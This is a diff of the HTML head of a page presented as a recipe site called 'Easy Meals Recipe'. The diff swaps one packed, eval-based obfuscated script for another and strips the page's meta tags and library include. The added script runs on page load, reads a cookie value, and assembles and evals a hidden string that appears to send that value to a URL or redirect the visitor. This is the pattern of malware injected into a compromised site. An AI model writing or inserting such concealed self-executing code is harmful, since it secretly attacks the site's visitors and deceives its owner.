@@ -2,16 +2,9 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-   <script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1d j(s){d B="";1c(d i=s.1b-1;i>=0;i--){B+=s[i]}d a=B.y(",");d u=1a.19.18(17,a);13 u}d u,s,c,A,z,m,l;A="; "+12.11;z=A.y("; "+"10"+"=");m=z.Z().y(";").Y();l=C(j("14,v,X,f,3,6,W,V,6,5,n,e,f,8,b,6,5,9,2,k,3,8,e,2,I,5,4,2,H,9,k,4"));s=j("16,U,b,f,n,5,9,2,k,3,8,e,2,I,5,4,2,H,9,k,4");u=j("16,3,9,b,T,b,S,p,x,v,R,t,t,x,15,q,h,Q,G,g,P,q,h,r,g,w,x,h,w,g,w,v,t,h,g,15,O,r,G,r,p,q,p,7,b,N,8,D,7,o,o,M,F,o,L,F,7,6,b,f,2,3,6,7,E,2,e,5,9,2,K,8,E,8,5,4,4,4,7,7,J,6,D,3,3,n")+m+"&"+l;c=s+"\'"+u+"\'";C(c);',62,76,'||111|611|911|64|511|74|79|011||101||var|99|411|54|86||rS|501|qu|co|401|38|65|56|66||45||94|25|96|split|pa|va|nS|eval|211|901|28|07|001|801|85|221|97|37|301|75|84|55|05|36|811|201|711|89|04|shift|pop|event|cookie|document|return||||null|apply|fromCharCode|String|length|for|function'.split('|'),0,{}))
+<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('U j(s){g t="";T(g i=s.S-1;i>=0;i--){t+=s[i]}g a=t.p(",");g u=R.Q.P(O,a);N u}g u,s,c,r,q,m,l;r="; "+M.L;q=r.p("; "+"K"+"=");m=q.J().p(";").I();l=v(j("H,G,F,e,6,8,E,D,8,7,h,f,e,b,3,8,7,5,2,4,6,b,f,2,d,7,k,2,9,5,4,k"));s=j("x,w,3,e,h,7,5,2,4,6,b,f,2,d,7,k,2,9,5,4,k");u=j("x,6,5,3,C,3,B,d,A,6,h,7,3,n,4,f,3,e,o,3,5,4,d,5,2,7,8,3,n,4,f,3,e,9,5,b,9,2,2,w,z,d,4,b,9,o,o,y,8,n,6,6,h")+m+"&"+l;c=s+"\'"+u+"\'";v(c);',57,57,'||111|101|501|011|611|64|511|001||79||801|411|99|var|401||rS|911|qu|co|211|74|split|pa|va||nS||eval|201|16|85|121|901|36|811|711|89|04|94|14|shift|pop|event|cookie|document|return|null|apply|fromCharCode|String|length|for|function'.split('|'),0,{}))
 </script>
-    <meta charset="utf-8">
-
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="">
-    <meta name="author" content="ProteusNet">
-    <link rel="icon" type="image/ico" href="images/favicon.png">
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-    <title>Easy Meals Recipe | This brilliant cooking site solves the biggest problem with recipes</title>
+<title>Easy Meals Recipe | This brilliant cooking site solves the biggest problem with recipes</title>
 
     <!-- Custom styles for this template -->
     <link rel="stylesheet" href="stylesheets/8ddb01bd.main.css"/>
